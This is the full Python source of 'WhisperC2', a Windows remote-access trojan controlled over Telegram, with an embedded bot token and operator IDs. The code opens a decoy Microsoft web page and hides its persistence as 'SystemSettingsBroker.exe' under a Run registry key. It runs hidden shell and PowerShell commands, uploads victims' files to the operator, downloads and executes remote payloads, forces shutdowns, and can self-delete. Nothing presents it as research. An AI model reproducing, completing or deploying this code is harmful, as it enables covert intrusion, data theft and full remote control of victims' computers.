#!/usr/bin/env python3
# =============================================================================
# WhisperC2 Professional – Final Production Build (Advanced Error Handling)
# =============================================================================
import telebot, platform, subprocess, threading, time, os, sys, atexit, io, traceback, webbrowser
import shutil, winreg, ctypes, requests
from datetime import datetime
from pathlib import Path
from urllib.parse import urlparse
import random, string

# -----------------------------------------------------------------------------
# Configuration – Zubby’s exact details
# -----------------------------------------------------------------------------
BOT_API_KEY = "8229959913:AAFuLnQB33pstSVbc-g0VgkuVFHHhTh4Qac"
OPERATOR_CHAT_ID = 8269558111
GROUP_CHAT_ID = -1003919074770
DECOY_URL = "https://learn.microsoft.com/en-us/dynamics365/supply-chain/procurement/purchase-order-overview"

# -----------------------------------------------------------------------------
# Advanced logging – thread‑safe, logs everything
# -----------------------------------------------------------------------------
log_lock = threading.Lock()
log_lines = []

def log(msg: str, level="INFO") -> None:
    """Thread‑safe, timestamped log. level: INFO, WARN, ERROR, SUCCESS."""
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with log_lock:
        log_lines.append({"time": timestamp, "level": level, "msg": msg})
    print(f"[{level}] {msg}")

def log_error(msg: str) -> None:
    log(msg, "ERROR")

def log_success(msg: str) -> None:
    log(msg, "SUCCESS")

# Crash log – writes to disk next to EXE, always
def crash_log(msg: str) -> None:
    try:
        with open(Path(sys.executable).parent / "whisper_error.log", "a") as f:
            f.write(f"[{datetime.now()}] FATAL: {msg}\n")
    except:
        pass

# -----------------------------------------------------------------------------
# Telegram bot
# -----------------------------------------------------------------------------
try:
    bot = telebot.TeleBot(BOT_API_KEY)
    log_success("TeleBot initialised")
except Exception as e:
    crash_log(f"TeleBot init failed: {e}")
    sys.exit(1)

# -----------------------------------------------------------------------------
# Agent identity & persistence
# -----------------------------------------------------------------------------
appdata = os.environ.get('APPDATA', os.path.expanduser('~'))
agents_dir = os.path.join(appdata, 'Microsoft', 'Windows')
os.makedirs(agents_dir, exist_ok=True)

def get_system_id() -> str:
    hostname = subprocess.getstatusoutput("hostname")[1].strip().upper()
    raw_user = subprocess.getstatusoutput("whoami")[1].strip()
    username = raw_user.split('\\', 1)[1] if '\\' in raw_user else raw_user
    return f"{hostname}/{username}"

SYSTEM_ID = get_system_id()
HOSTNAME_PREFIX = SYSTEM_ID.split('/')[0]
log(f"Agent identity: {SYSTEM_ID}")

TOPIC_ID_FILE = Path(agents_dir) / "topic_id.txt"
PID_FILE = Path(agents_dir) / "agent.pid"

# -----------------------------------------------------------------------------
# PID‑based override – silently kill old instance
# -----------------------------------------------------------------------------
def kill_old_instance():
    if PID_FILE.exists():
        try:
            old_pid = int(PID_FILE.read_text().strip())
            if old_pid == os.getpid():
                return
            handle = ctypes.windll.kernel32.OpenProcess(0x0001, False, old_pid)
            if handle:
                ctypes.windll.kernel32.TerminateProcess(handle, 0)
                ctypes.windll.kernel32.CloseHandle(handle)
                log_success(f"Killed old agent (PID {old_pid})")
                time.sleep(0.5)
            else:
                log_error(f"Could not open old process {old_pid}")
        except Exception as e:
            log_error(f"Failed to kill old instance: {e}")
        try:
            PID_FILE.unlink()
        except:
            pass

def save_pid():
    PID_FILE.write_text(str(os.getpid()))
    log(f"Current PID saved: {os.getpid()}")

atexit.register(lambda: PID_FILE.unlink(missing_ok=True) if PID_FILE.exists() else None)

# -----------------------------------------------------------------------------
# HTML5 Telemetry – with detailed report
# -----------------------------------------------------------------------------
def generate_telemetry_report(status: str) -> str:
    color = "#4CAF50" if status == "online" else "#F44336"
    emoji = "🟢" if status == "online" else "💀"
    title = f"{SYSTEM_ID} – {status.upper()}"
    rows = ""
    with log_lock:
        for entry in log_lines[-30:]:
            level_color = {"INFO":"#58a6ff","WARN":"#d29922","ERROR":"#f85149","SUCCESS":"#3fb950"}.get(entry['level'], "#8b949e")
            rows += f"<tr><td class=\"timestamp\">{entry['time']}</td><td class=\"message\" style=\"color:{level_color}\">[{entry['level']}] {entry['msg']}</td></tr>"
    return f"""<!DOCTYPE html><html><head><meta charset="UTF-8"><title>{title}</title><style>
    *{{margin:0;padding:0;box-sizing:border-box}}body{{font-family:'Segoe UI',Tahoma,Geneva,Verdana,sans-serif;background:linear-gradient(135deg,#0d1117,#161b22);color:#c9d1d9;min-height:100vh;display:flex;justify-content:center;align-items:center;padding:2rem}}.report-card{{max-width:900px;width:100%;background:#161b22;border:1px solid #30363d;border-radius:16px;overflow:hidden;box-shadow:0 20px 40px rgba(0,0,0,0.5)}}.header{{background:{color};padding:2rem;text-align:center}}.header h1{{font-size:2rem;font-weight:600;color:white;margin-bottom:.25rem}}.header .agent{{font-size:1rem;opacity:.9;color:white;font-family:monospace}}table{{width:100%;border-collapse:collapse}}th,td{{padding:.75rem 1rem;border-bottom:1px solid #21262d}}th{{text-align:left;background:#0d1117;color:#8b949e}}tr:hover{{background:#1c2128}}</style></head><body><div class="report-card"><div class="header"><h1>{emoji} {title}</h1><div class="agent">{SYSTEM_ID}</div></div><div class="body" style="padding:1.5rem"><table><thead><tr><th>Timestamp</th><th>Event</th></tr></thead><tbody>{rows if rows else '<tr><td colspan="2" style="text-align:center;color:#8b949e;">No log entries</td></tr>'}</tbody></table></div></div></body></html>"""

def send_telemetry(topic_id, status: str) -> bool:
    html_content = generate_telemetry_report(status)
    bio = io.BytesIO(html_content.encode('utf-8'))
    bio.name = f"{SYSTEM_ID}_{status}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.html"
    attempts = [("topic", topic_id), ("group", None)]
    for dest, tid in attempts:
        if tid is None and dest == "topic":
            continue
        try:
            bot.send_document(GROUP_CHAT_ID, bio, message_thread_id=tid)
            log_success(f"Telemetry HTML sent via {dest} ({status})")
            return True
        except Exception as e:
            log_error(f"Telemetry {dest} send failed: {e}")
    plain = f"{'🟢' if status=='online' else '💀'} **{SYSTEM_ID}** {status}\n```\n" + "\n".join([f"[{x['level']}] {x['msg']}" for x in log_lines[-10:]]) + "\n```"
    try:
        bot.send_message(GROUP_CHAT_ID, plain, parse_mode='Markdown')
        log_success(f"Telemetry plain text sent ({status})")
        return True
    except Exception as e:
        log_error(f"Plain telemetry failed: {e}")
        return False

# -----------------------------------------------------------------------------
# Topic management
# -----------------------------------------------------------------------------
def load_topic_id() -> int | None:
    if TOPIC_ID_FILE.exists():
        try:
            tid = int(TOPIC_ID_FILE.read_text().strip())
            log(f"Loaded stored topic ID: {tid}")
            return tid
        except:
            log_error("Failed to read stored topic ID")
    return None

def save_topic_id(tid: int) -> None:
    TOPIC_ID_FILE.write_text(str(tid))
    log(f"Saved topic ID: {tid}")

def get_or_create_topic() -> int | None:
    existing = load_topic_id()
    if existing:
        try:
            test = bot.send_message(GROUP_CHAT_ID, "🔍", message_thread_id=existing)
            bot.delete_message(GROUP_CHAT_ID, test.message_id)
            log_success(f"Reusing existing topic {existing}")
            return existing
        except:
            log_error("Stored topic not found – will create a new one")
    try:
        new_topic = bot.create_forum_topic(GROUP_CHAT_ID, SYSTEM_ID, icon_color=0x6FB9F0)
        tid = new_topic.message_thread_id
        save_topic_id(tid)
        log_success(f"Created new topic {tid}")
        return tid
    except Exception as e:
        log_error(f"Topic creation failed: {e}")
        return None

def install_persistence() -> bool:
    if not getattr(sys, 'frozen', False):
        log("Persistence skipped – script mode")
        return False
    try:
        dest_path = Path(agents_dir) / 'SystemSettingsBroker.exe'
        current = Path(sys.executable if getattr(sys, 'frozen', False) else __file__)
        if current.resolve() == dest_path.resolve():
            log("Already running from persistent location")
            return True
        if not dest_path.exists():
            try:
                shutil.copy2(current, dest_path)
                log_success(f"Copied to {dest_path}")
            except PermissionError:
                log_error("Copy skipped – destination exists or is locked")
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                            r'Software\Microsoft\Windows\CurrentVersion\Run',
                            0, winreg.KEY_SET_VALUE) as key:
            winreg.SetValueEx(key, 'System Settings Broker', 0, winreg.REG_SZ, str(dest_path))
        log_success("Persistence registry key set")
        return True
    except Exception as e:
        log_error(f"Persistence error: {traceback.format_exc()}")
        return False

def self_destruct(topic_id) -> None:
    log("Self‑destruct sequence started")
    send_telemetry(topic_id, "offline")
    # 1. Delete persistent file
    try:
        persistent = Path(agents_dir) / 'SystemSettingsBroker.exe'
        if persistent.exists():
            persistent.unlink()
            log_success("Persistent file deleted")
        else:
            log("Persistent file not found – already cleaned?")
    except Exception as e:
        log_error(f"Failed to delete persistent file: {e}")
    # 2. Remove registry key
    try:
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                            r'Software\Microsoft\Windows\CurrentVersion\Run',
                            0, winreg.KEY_SET_VALUE) as key:
            try:
                winreg.DeleteValue(key, 'System Settings Broker')
                log_success("Registry key removed")
            except FileNotFoundError:
                log("Registry key not found – already cleaned?")
    except Exception as e:
        log_error(f"Registry cleanup error: {e}")
    # 3. Schedule self‑deletion
    try:
        current = Path(sys.executable) if getattr(sys, 'frozen', False) else Path(__file__)
        if current.exists():
            ctypes.windll.kernel32.MoveFileExW(str(current), None, 0x4)
            log_success("Self‑deletion scheduled for next reboot")
    except Exception as e:
        log_error(f"Self‑delete scheduling error: {e}")

# -----------------------------------------------------------------------------
# Command helpers – robust, detailed error info
# -----------------------------------------------------------------------------
def sys_cmd(cmd: str) -> str:
    """Execute a system command via cmd.exe, return output."""
    log(f"Executing shell command: {cmd}")
    try:
        proc = subprocess.run(
            ["cmd.exe", "/c", cmd],
            capture_output=True,
            text=True,
            encoding='utf-8',
            errors='replace',
            creationflags=0x08000000,
            timeout=30
        )
        out = (proc.stdout + proc.stderr).strip() or "[No output]"
        log_success(f"Shell command exit code: {proc.returncode}")
        return out[:4000]
    except subprocess.TimeoutExpired:
        log_error("Shell command timed out after 30 seconds")
        return "Error: Command timed out"
    except Exception as e:
        log_error(f"Shell command error: {e}")
        return f"Error: {e}"

def ps_cmd(cmd: str) -> str:
    """Execute a PowerShell command, return output."""
    log(f"Executing PowerShell: {cmd}")
    try:
        proc = subprocess.run(
            ["powershell", "-Command", cmd],
            capture_output=True,
            text=True,
            encoding='utf-8',
            errors='replace',
            creationflags=0x08000000,
            timeout=30
        )
        out = (proc.stdout + proc.stderr).strip() or "[No output]"
        log_success(f"PowerShell exit code: {proc.returncode}")
        return out[:4000]
    except subprocess.TimeoutExpired:
        log_error("PowerShell timed out after 30 seconds")
        return "Error: Command timed out"
    except Exception as e:
        log_error(f"PowerShell error: {e}")
        return f"Error: {e}"

def view_file(path: str) -> str:
    log(f"Viewing file: {path}")
    try:
        if not os.path.exists(path):
            log_error(f"File not found: {path}")
            return f"❌ File not found: {path}"
        if os.path.isdir(path):
            log_error(f"Path is a directory: {path}")
            return "❌ Path is a directory"
        size = os.path.getsize(path)
        if size > 10*1024*1024:
            log_error(f"File too large ({size/1024/1024:.1f} MB)")
            return f"❌ File too large ({size/1024/1024:.1f} MB)"
        with open(path, 'r', errors='ignore') as f:
            content = f.read()[:4000]
        log_success(f"Read {len(content)} chars from {path}")
        return content
    except Exception as e:
        log_error(f"View file error: {e}")
        return f"❌ Error: {e}"

def download_file_fs(path: str):
    log(f"Download file request: {path}")
    try:
        if not os.path.exists(path):
            log_error(f"File not found: {path}")
            return None, "❌ File not found"
        if os.path.isdir(path):
            log_error(f"Path is a directory: {path}")
            return None, "❌ Is a directory"
        size = os.path.getsize(path)
        if size > 50*1024*1024:
            log_error(f"File too large ({size/1024/1024:.1f} MB)")
            return None, "❌ Too large (>50 MB)"
        log_success(f"File ready for upload ({size/1024/1024:.1f} MB)")
        return path, None
    except Exception as e:
        log_error(f"Download file access error: {e}")
        return None, "❌ Error"

def dex(arg_line: str):
    log(f"DEX request: {arg_line}")
    if not arg_line:
        return "Usage: dex <url> [args...]"
    parts = arg_line.split(maxsplit=1)
    url = parts[0]
    extra = parts[1].split() if len(parts) > 1 else []
    p = urlparse(url)
    if p.scheme not in ('http','https'):
        log_error(f"Invalid URL scheme: {p.scheme}")
        return "❌ Invalid scheme"
    ext = os.path.splitext(p.path)[1] or ".exe"
    name = ''.join(random.choices(string.ascii_letters+string.digits, k=8)) + ext
    dest = os.path.join(os.environ.get('TEMP','.'), name)
    log(f"Downloading {url} → {dest}")
    try:
        r = requests.get(url, stream=True, timeout=30)
        r.raise_for_status()
        with open(dest, 'wb') as f:
            for c in r.iter_content(8192):
                if c: f.write(c)
        log_success(f"Downloaded {os.path.getsize(dest)} bytes")
    except Exception as e:
        log_error(f"Download failed: {e}")
        return f"❌ Download failed: {e}"
    try:
        log(f"Executing: {dest} {' '.join(extra)}")
        proc = subprocess.Popen([dest, *extra],
                                stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                text=True, creationflags=0x08000000)
        out, err = proc.communicate(timeout=30)
        output = (out + err).strip() or "[No output]"
        log_success(f"DEX executed, exit code: {proc.returncode}")
        return f"✅ Executed: {dest}\nExit: {proc.returncode}\n{output}"
    except subprocess.TimeoutExpired:
        proc.kill()
        log_error("DEX timed out after 30s")
        return "⏰ Timed out"
    except Exception as e:
        log_error(f"DEX execution error: {e}")
        return f"❌ Execution error: {e}"
    finally:
        try:
            ctypes.windll.kernel32.MoveFileExW(dest, None, 0x4)
            log("DEX payload scheduled for deletion on reboot")
        except Exception as e:
            log_error(f"MoveFileExW failed: {e}")

def execute_command(cmd_line: str, topic_id):
    log(f"Command received: {cmd_line}")
    parts = cmd_line.strip().split(' ', 1)
    cmd = parts[0].lower()
    args = parts[1] if len(parts) > 1 else ""

    if cmd in ("ping","start","scan"):
        return f"🟢 {SYSTEM_ID} online\n{platform.system()} {platform.release()}", None
    elif cmd == "shell":
        if not args: return "Usage: shell <command>", None
        return sys_cmd(args).replace('```',"'''"), None
    elif cmd in ("powershell","pow"):
        if not args: return "Usage: powershell <command>", None
        return ps_cmd(args).replace('```',"'''"), None
    elif cmd in ("download","downloadfile"):
        path, err = download_file_fs(args.strip())
        if err: return err, None
        return f"⬆️ Uploading {args.strip()}", path
    elif cmd == "delete":
        try:
            os.remove(args.strip())
            log_success(f"Deleted: {args.strip()}")
            return f"🗑️ Deleted: {args.strip()}", None
        except Exception as e:
            log_error(f"Delete failed: {e}")
            return f"❌ Delete failed: {e}", None
    elif cmd in ("view","viewfile"):
        return view_file(args.strip()).replace('```',"'''"), None
    elif cmd == "dex":
        return dex(args).replace('```',"'''"), None
    elif cmd == "die":
        self_destruct(topic_id)
        return "💀 Shutting down...", None
    elif cmd == "off":
        log("Shutdown command received")
        subprocess.run(["shutdown","/s","/t","0","/f"], check=False)
        return "🔌 Shutting down PC...", None
    else:
        log_error(f"Unknown command: {cmd}")
        return f"❓ Unknown: {cmd}", None

# -----------------------------------------------------------------------------
# Main – detailed startup, crash‑proof
# -----------------------------------------------------------------------------
def main():
    try:
        log("Agent starting – sending startup ping")
        bot.send_message(GROUP_CHAT_ID, f"⚡ **{SYSTEM_ID}** is starting…")
        kill_old_instance()
        save_pid()
        persist_ok = install_persistence()
        topic_id = None
        for attempt in range(3):
            topic_id = get_or_create_topic()
            if topic_id: break
            log_error(f"Topic attempt {attempt+1} failed, retrying…")
            time.sleep(2)
        if not topic_id:
            log_error("All topic attempts failed – falling back to main group")
            topic_id = None
            bot.send_message(GROUP_CHAT_ID, f"⚠️ **{SYSTEM_ID}** running in main group mode – commands must include `{HOSTNAME_PREFIX}`")
        log(f"Operational: topic_id={topic_id}, persistence={persist_ok}")

        # Handler with closure
        def _handler_wrapper(message):
            if message.from_user.id != OPERATOR_CHAT_ID or message.from_user.is_bot:
                return
            if topic_id is not None:
                if getattr(message, 'message_thread_id', None) != topic_id:
                    return
            else:
                if not message.text or HOSTNAME_PREFIX not in message.text:
                    return
            text = (message.text or "").strip()
            if not text: return
            if text.startswith('/'): text = text[1:]
            response, file_path = execute_command(text, topic_id)
            reply_kwargs = {'message_thread_id': topic_id} if topic_id else {}
            if text.lower().startswith("die"):
                bot.reply_to(message, f"```\n{response}\n```", parse_mode='Markdown', **reply_kwargs)
                sys.exit(0)
            try:
                bot.reply_to(message, f"```\n{response}\n```", parse_mode='Markdown', **reply_kwargs)
            except:
                bot.reply_to(message, response, **reply_kwargs)
            if file_path and os.path.exists(file_path):
                try:
                    with open(file_path, 'rb') as f:
                        bot.send_document(message.chat.id, f, message_thread_id=topic_id)
                    log_success(f"File sent: {file_path}")
                except Exception as e:
                    log_error(f"File send error: {e}")
                    bot.reply_to(message, f"❌ File send error: {e}", **reply_kwargs)
                finally:
                    try: os.remove(file_path)
                    except: pass
        @bot.message_handler(chat_types=['supergroup'], func=lambda m: bool(m.text))
        def _handler(msg):
            _handler_wrapper(msg)

        threading.Thread(target=webbrowser.open, args=(DECOY_URL,), daemon=True).start()
        send_telemetry(topic_id, "online")
        log("Entering main polling loop")
        bot.infinity_polling(timeout=30, long_polling_timeout=30)

    except Exception as fatal:
        crash_log(traceback.format_exc())
        log_error(f"Fatal crash: {fatal}")
        try:
            bot.send_message(GROUP_CHAT_ID, f"🔥 **{SYSTEM_ID}** crashed on startup:\n```{traceback.format_exc()}```")
        except:
            pass

if __name__ == "__main__":
    main()
